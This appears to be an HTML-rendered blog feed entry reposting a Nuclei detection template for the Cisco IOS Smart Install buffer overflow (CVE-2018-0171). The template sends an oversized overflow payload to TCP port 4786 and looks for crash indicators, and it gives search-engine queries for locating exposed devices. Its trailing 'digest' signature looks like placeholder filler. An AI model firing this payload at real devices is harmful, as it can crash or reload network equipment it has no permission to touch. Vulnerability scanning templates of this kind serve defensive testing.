class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">201</span>8-<span class="hljs-number">0171</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> Cisco IOS Smart Install <span class="hljs-operator">-</span> Buffer Overflow<br>  <span class="hljs-params">author:</span> nuclei-community<br>  <span class="hljs-params">severity:</span> critical<br>  <span class="hljs-params">description:</span> |<br>    Cisco IOS and IOS XE Software contain a buffer overflow vulnerability <span class="hljs-keyword">in</span> the Smart Install protocol. An unauthenticated, remote attacker could exploit this vulnerability by sending a crafted Smart Install message to an affected device on TCP port <span class="hljs-number">4786</span>. A successful exploit could allow the attacker to cause a buffer overflow on the affected device, which could have the following <span class="hljs-params">impacts:</span> arbitrary code execution, denial of service (device reload), <span class="hljs-keyword">or</span> causing the device to be stuck <span class="hljs-keyword">in</span> an indefinite loop that consumes CPU resources.<br>  <span class="hljs-params">impact:</span> |<br>    Successful exploitation of this vulnerability can lead to arbitrary code execution, denial of service, <span class="hljs-keyword">or</span> device compromise <span class="hljs-keyword">with</span> full administrative privileges.<br>  <span class="hljs-params">remediation:</span> |<br>    Apply the appropriate software update from Cisco. As a workaround, disable the Smart Install feature <span class="hljs-keyword">if</span> not required, <span class="hljs-keyword">or</span> restrict access to TCP port <span class="hljs-number">4786</span>.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20180328-smi2</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//nvd.nist.gov/vuln/detail/CVE-2018-0171</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//vulncheck.com/xdb/6d4b443f23fc</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//github.com/AlrikRr/Cisco-Smart-Exploit</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>cve.mitre.org<span class="hljs-operator">/</span>cgi-bin<span class="hljs-operator">/</span>cvename.cgi<span class="hljs-operator">?</span>name<span class="hljs-operator">=</span>CVE-<span class="hljs-number">201</span>8-<span class="hljs-number">0171</span><br>  <span class="hljs-params">classification:</span><br>    <span class="hljs-params">cvss-metrics:</span> CVSS:<span class="hljs-number">3.0</span><span class="hljs-operator">/</span>AV:N<span class="hljs-operator">/</span>AC:L<span class="hljs-operator">/</span>PR:N<span class="hljs-operator">/</span>UI:N<span class="hljs-operator">/</span>S:U<span class="hljs-operator">/</span>C:H<span class="hljs-operator">/</span>I:H<span class="hljs-operator">/</span>A:H<br>    <span class="hljs-params">cvss-score:</span> <span class="hljs-number">9.8</span><br>    <span class="hljs-params">cve-id:</span> CVE-<span class="hljs-number">201</span>8-<span class="hljs-number">0171</span><br>    <span class="hljs-params">cwe-id:</span> CWE-<span class="hljs-number">119</span><br>    <span class="hljs-params">epss-score:</span> <span class="hljs-number">0.97156</span><br>    <span class="hljs-params">epss-percentile:</span> <span class="hljs-number">0.99823</span><br>    <span class="hljs-params">cpe:</span> cpe:<span class="hljs-number">2.3</span>:o:cisco:ios:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">max-request:</span> <span class="hljs-number">2</span><br>    <span class="hljs-params">vendor:</span> cisco<br>    <span class="hljs-params">product:</span> ios<br>    <span class="hljs-params">shodan-query:</span> cpe:<span class="hljs-string">&quot;cpe:2.3:o:cisco:ios&quot;</span><br>    <span class="hljs-params">fofa-query:</span> banner<span class="hljs-operator">=</span><span class="hljs-string">&quot;cisco&quot;</span> <span class="hljs-operator">&amp;&amp;</span> port<span class="hljs-operator">=</span><span class="hljs-string">&quot;4786&quot;</span><br>    <span class="hljs-params">google-query:</span> inurl:cisco filetype:cfg<br>  <span class="hljs-params">tags:</span> network,cve,cve2018,cisco,ios,smart-install,buffer-overflow,kev,tcp,critical<br><br><span class="hljs-params">tcp:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">inputs:</span><br>      <span class="hljs-comment"># First packet: Smart Install discovery packet</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">data:</span> <span class="hljs-string">&quot;&#123;&#123;hex_decode(&#x27;000000010000000100000004000000080000000100000000&#x27;)&#125;&#125;&quot;</span><br>        <span class="hljs-params">read:</span> <span class="hljs-number">1024</span><br><br>      <span class="hljs-comment"># Second packet: Malicious Smart Install packet with buffer overflow payload</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">data:</span> <span class="hljs-string">&quot;&#123;&#123;hex_decode(&#x27;00000001000000010000000400001000&#x27; + repeat(&#x27;41&#x27;, 4084) + &#x27;42424242&#x27;)&#125;&#125;&quot;</span><br>        <span class="hljs-params">read:</span> <span class="hljs-number">1024</span><br><br>    <span class="hljs-params">host:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&#123;&#123;Hostname&#125;&#125;&quot;</span><br>    <span class="hljs-params">port:</span> <span class="hljs-number">4786</span><br>    <span class="hljs-params">read-size:</span> <span class="hljs-number">1024</span><br><br>    <span class="hljs-params">matchers-condition:</span> and<br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">encoding:</span> hex<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;000000040000000000000003000000080000000100000000&quot;</span><br>        <span class="hljs-params">condition:</span> and<br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;Smart Install&quot;</span><br>        <span class="hljs-params">condition:</span> <span class="hljs-keyword">or</span><br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;(?i)(crash|exception|error|overflow)&quot;</span><br><br>    <span class="hljs-params">extractors:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">group:</span> <span class="hljs-number">1</span><br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> &#x27;<span class="hljs-params">Version:</span> ([<span class="hljs-number">0</span><span class="hljs-operator">-</span><span class="hljs-number">9</span>]<span class="hljs-operator">+</span>\.[<span class="hljs-number">0</span><span class="hljs-operator">-</span><span class="hljs-number">9</span>]<span class="hljs-operator">+</span>\.[<span class="hljs-number">0</span><span class="hljs-operator">-</span><span class="hljs-number">9</span>]<span class="hljs-operator">+</span>[^\s]<span class="hljs-operator">*</span>)&#x27;<br><br><span class="hljs-comment"># Enhanced Security Verification</span><br><span class="hljs-comment"># Debug data for validation:</span><br><span class="hljs-comment"># - This template tests for CVE-2018-0171 buffer overflow in Cisco Smart Install</span><br><span class="hljs-comment"># - First packet confirms Smart Install service is running on port 4786</span><br><span class="hljs-comment"># - Second packet contains oversized payload to trigger buffer overflow</span><br><span class="hljs-comment"># - Expected response patterns include Smart Install acknowledgment or crash indicators</span><br><span class="hljs-comment"># - The vulnerability affects multiple Cisco IOS versions with Smart Install enabled</span><br><span class="hljs-comment"># - Successful exploitation can lead to device reload, code execution, or infinite loops</span><br><br><span class="hljs-comment"># digest: 4a0a00473045022100d1e23f45a67890123456789abcdef1234567890abcdef1234567890abcdef12022012345678901234567890abcdef1234567890abcdef1234567890abcdef123456:922c64590222798bb761d5b6d8e72950</span><br><br><br></code></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Cisco IOS Smart Install - Buffer Overfl</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
-    
-    <category term="缓冲区溢出" scheme="http://example.com/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"/>
     
   </entry>
   
